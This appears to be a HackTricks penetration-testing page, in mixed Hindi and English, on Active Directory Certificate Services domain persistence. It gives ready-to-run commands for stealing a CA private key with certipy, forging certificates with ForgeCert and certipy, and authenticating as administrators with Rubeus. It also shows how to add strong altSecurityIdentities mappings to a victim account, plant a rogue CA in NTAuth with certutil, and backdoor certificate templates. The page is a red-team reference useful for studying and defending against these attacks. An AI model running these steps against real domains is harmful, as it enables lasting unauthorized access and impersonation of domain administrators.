# AD CS डोमेन परस्थिरता

{{#include ../../../banners/hacktricks-training.md}}

**This is a summary of the domain persistence techniques shared in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Check it for further details.

## Forging Certificates with Stolen CA Certificates - DPERSIST1

How can you tell that a certificate is a CA certificate?

यह पता लगाया जा सकता है कि कोई प्रमाणपत्र CA प्रमाणपत्र है यदि निम्नलिखित शर्तें पूरी हों:

- प्रमाणपत्र CA सर्वर पर संग्रहीत होता है, और इसका private key मशीन के DPAPI द्वारा सुरक्षित रहता है, या यदि ऑपरेटिंग सिस्टम समर्थन करता है तो TPM/HSM जैसे हार्डवेयर द्वारा।
- प्रमाणपत्र के Issuer और Subject फ़ील्ड दोनों CA के distinguished name से मेल खाते हैं।
- "CA Version" extension केवल CA प्रमाणपत्रों में मौजूद होता है।
- प्रमाणपत्र में Extended Key Usage (EKU) फ़ील्ड नहीं होते हैं।

इस प्रमाणपत्र की private key निकालने के लिए, CA सर्वर पर built-in GUI के माध्यम से `certsrv.msc` टूल समर्थित तरीका है। फिर भी, यह प्रमाणपत्र सिस्टम में संग्रहीत अन्य प्रमाणपत्रों से अलग नहीं है; इसलिए निकालने के लिए [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) जैसे तरीके लागू किए जा सकते हैं।

यह प्रमाणपत्र और private key Certipy का उपयोग करके निम्नलिखित कमांड से भी प्राप्त किए जा सकते हैं:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
यदि .pfx फॉर्मैट में CA certificate और उसकी private key प्राप्त कर ली जाएं, तो [ForgeCert](https://github.com/GhostPack/ForgeCert) जैसे टूल्स का उपयोग वैध प्रमाणपत्र बनाने के लिए किया जा सकता है:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> प्रमाण-पत्र जाली बनाने के लिए लक्षित उपयोगकर्ता Active Directory में सक्रिय और प्रमाणीकरण करने में सक्षम होना चाहिए, तभी प्रक्रिया सफल होगी। krbtgt जैसे विशेष खातों के लिए प्रमाण-पत्र बनाना प्रभावहीन है।

यह जाली प्रमाण-पत्र निर्दिष्ट समाप्ति तिथि तक और तब तक **valid** रहेगा जब तक कि रूट CA प्रमाण-पत्र **valid** है (आम तौर पर 5 से **10+ years**). यह **machines** के लिए भी वैध है, इसलिए **S4U2Self** के साथ संयोजन में, एक हमलावर CA प्रमाण-पत्र वैध रहने तक किसी भी डोमेन मशीन पर **कायमी मौजूदगी बनाए रख सकता है**.\
इसके अलावा, इस विधि से उत्पन्न **certificates generated** को CA के अवगत न होने के कारण **cannot be revoked** किया नहीं जा सकता।

### Operating under Strong Certificate Mapping Enforcement (2025+)

Since February 11, 2025 (after KB5014754 rollout), domain controllers default to **Full Enforcement** for certificate mappings. Practically this means your forged certificates must either:

- लक्ष्य खाते के साथ एक मजबूत बाइंडिंग होनी चाहिए (उदाहरण के लिए, the SID security extension), या
- लक्ष्य ऑब्जेक्ट के `altSecurityIdentities` attribute पर एक मजबूत, स्पष्ट mapping के साथ जोड़ी गई हो।

A reliable approach for persistence is to mint a forged certificate chained to the stolen Enterprise CA and then add a strong explicit mapping to the victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
नोट्स
- यदि आप ऐसे नकली प्रमाणपत्र बना सकते हैं जिनमें SID security extension शामिल हो, तो वे Full Enforcement के तहत भी स्वतः मैप हो जाएंगे। अन्यथा, स्पष्ट मजबूत मैपिंग्स को प्राथमिकता दें। अधिक जानकारी के लिए [account-persistence](account-persistence.md) देखें।
- यहाँ रद्दीकरण (revocation) defenders के लिए मददगार नहीं है: नकली प्रमाणपत्र CA database में अज्ञात होते हैं और इसलिए उन्हें revoked नहीं किया जा सकता।

## Rogue CA Certificates पर भरोसा - DPERSIST2

`NTAuthCertificates` object को परिभाषित किया गया है ताकि इसके `cacertificate` attribute के अंदर एक या अधिक **CA certificates** शामिल हों, जिन्हें Active Directory (AD) उपयोग करता है। सत्यापन प्रक्रिया **domain controller** द्वारा इस बात की जाँच करती है कि क्या `NTAuthCertificates` object में authenticating **certificate** के Issuer फ़ील्ड में निर्दिष्ट **CA specified** से मेल खाने वाली कोई एंट्री मौजूद है। यदि मेल मिल जाता है तो authentication आगे बढ़ती है।

एक self-signed CA certificate को `NTAuthCertificates` object में attacker द्वारा जोड़ा जा सकता है, बशर्ते वे इस AD object पर नियंत्रण रखते हों। सामान्यतः केवल **Enterprise Admin** समूह के सदस्य, साथ ही **Domain Admins** या **Administrators** जिन्हें **forest root’s domain** में अधिकार दिए गए हैं, इस object को संशोधित करने की अनुमति रखते हैं। वे `NTAuthCertificates` object को `certutil.exe` का उपयोग करके `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` कमांड से संपादित कर सकते हैं, या [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) का उपयोग कर सकते हैं।

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
यह क्षमता विशेष रूप से तब प्रासंगिक होती है जब इसे पहले उल्लिखित विधि के साथ मिलाकर उपयोग किया जाए जिसमें ForgeCert के माध्यम से सर्टिफिकेट्स को डायनामिक रूप से जनरेट करना शामिल है।

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## दुर्भावनापूर्ण गलत कॉन्फ़िगरेशन - DPERSIST3

AD CS के कंपोनेंट्स के **security descriptor modifications** के माध्यम से **persistence** के अवसर प्रचुर मात्रा में हैं। "[Domain Escalation](domain-escalation.md)" सेक्शन में वर्णित संशोधनों को डोमेन में उन्नत पहुँच वाले हमलावर द्वारा दुरुभावनापूर्ण रूप से लागू किया जा सकता है। इसमें संवेदनशील कंपोनेंट्स में "control rights" (जैसे WriteOwner/WriteDACL/etc.) जोड़ना शामिल है, जैसे:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

दुरुभावनापूर्ण क्रियान्वयन का एक उदाहरण यह होगा कि एक हमलावर, जिसके पास डोमेन में **elevated permissions** हैं, डिफ़ॉल्ट **`User`** certificate template में **`WriteOwner`** permission जोड़ दे, और हमलावर उस अधिकार का principal हो। इसको शोषण करने के लिए, हमलावर पहले **`User`** टेम्पलेट की ownership खुद कर लेगा। इसके बाद टेम्पलेट पर **`mspki-certificate-name-flag`** को **1** पर सेट किया जाएगा ताकि **`ENROLLEE_SUPPLIES_SUBJECT`** सक्षम हो और request में Subject Alternative Name प्रदान करने की अनुमति मिले। इसके पश्चात, हमलावर उस **template** का उपयोग करके **enroll** कर सकता है, विकल्प के रूप में एक **domain administrator** नाम चुन कर, और प्राप्त सर्टिफिकेट का उपयोग DA के रूप में authentication के लिए कर सकता है।

लंबी अवधि की डोमेन persistence के लिए हमलावर जो व्यावहारिक सेटिंग्स लागू कर सकते हैं (पूर्ण विवरण और डिटेक्शन के लिए देखें {{#ref}}domain-escalation.md{{#endref}}):

- CA policy flags जो requesters से SAN की अनुमति देते हैं (उदा., `EDITF_ATTRIBUTESUBJECTALTNAME2` को सक्षम करना)। यह ESC1-जैसे पथों को एक्सप्लॉइटेबल रखता है।
- Template DACL या सेटिंग्स जो authentication-capable issuance की अनुमति देती हैं (उदा., Client Authentication EKU जोड़ना, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` को सक्षम करना)।
- यदि defenders cleanup का प्रयास करते हैं तो rogue issuers को लगातार पुनः-परिचय कराने के लिए `NTAuthCertificates` ऑब्जेक्ट या CA कंटेनरों को नियंत्रित करना।

> [!TIP]
> In hardened environments after KB5014754, pairing these misconfigurations with explicit strong mappings (`altSecurityIdentities`) ensures your issued or forged certificates remain usable even when DCs enforce strong mapping.

## संदर्भ

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
